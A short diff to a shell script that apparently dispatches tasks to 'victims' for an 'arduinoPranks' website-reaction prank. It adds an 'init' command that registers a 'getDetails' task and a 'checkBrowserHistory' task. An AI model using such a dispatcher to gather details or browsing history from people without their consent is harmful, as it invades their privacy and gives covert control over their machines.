@@ -10,6 +10,7 @@ function usage(){
   echo "  listTasks"
   echo "  setVictimTask <victim> <taskID>"
   echo "  getVictimTask <victim>"
+  echo "  init"
   echo ""
 }
 
@@ -101,6 +102,15 @@ function getVictimTask() {
 
 ###############################################################################
 
+function initialize() {
+
+  addTask default arduinoPranks/master/websiteReactionPrank/task.getDetails
+  addTask checkBrowserHistory arduinoPranks/master/websiteReactionPrank/task.checkBrowserHistory
+
+}
+
+###############################################################################
+
 func=`echo "$1" | tr '[:upper:]' '[:lower:]'`
 
 case "$func" in
@@ -118,6 +128,9 @@ case "$func" in
     ;;
   listtasks)
     listTasks
+    ;;
+  init)
+    initialize
     ;;
   *)
     usage
